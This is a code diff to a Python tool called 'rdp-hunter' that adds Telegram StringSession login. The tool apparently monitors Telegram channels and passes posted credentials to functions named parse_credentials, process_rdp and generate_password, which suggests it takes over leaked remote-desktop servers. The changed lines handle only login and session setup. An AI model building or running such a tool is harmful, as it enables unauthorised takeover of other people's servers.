@@ -4,9 +4,10 @@ import json
 from datetime import datetime
 from telethon import TelegramClient, events
 from telethon.tl.types import PeerChannel
+from telethon.sessions import StringSession
 from config import (
     API_ID, API_HASH, CHANNEL_USERNAMES, SESSION_NAME,
-    SAVED_MESSAGES, PHONE_NUMBER, get_channels
+    SAVED_MESSAGES, PHONE_NUMBER, STRING_SESSION, get_channels
 )
 from changer import parse_credentials, process_rdp, generate_password
 
@@ -47,7 +48,13 @@ async def main():
         print("❌ No channels configured. Set CHANNEL_USERNAMES env var (comma-separated)")
         return
     
-    client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
+    if STRING_SESSION:
+        session = StringSession(STRING_SESSION)
+        client = TelegramClient(session, API_ID, API_HASH)
+        print("[*] Using StringSession")
+    else:
+        client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
+        print("[*] Using file session")
     
     @client.on(events.NewMessage(chats=channels))
     async def handler(event):
@@ -70,10 +77,16 @@ async def main():
     print("[*] rdp-hunter starting...")
     print(f"[*] Monitoring {len(channels)} channel(s): {', '.join(channels)}")
     
-    if PHONE_NUMBER:
+    if STRING_SESSION:
+        await client.connect()
+        if not await client.is_user_authorized():
+            print("❌ StringSession invalid/expired")
+            return
+    elif PHONE_NUMBER:
         await client.start(phone=PHONE_NUMBER)
     else:
         await client.start()
+    
     print("[*] Connected. Running 24/7...")
     await client.run_until_disconnected()
 
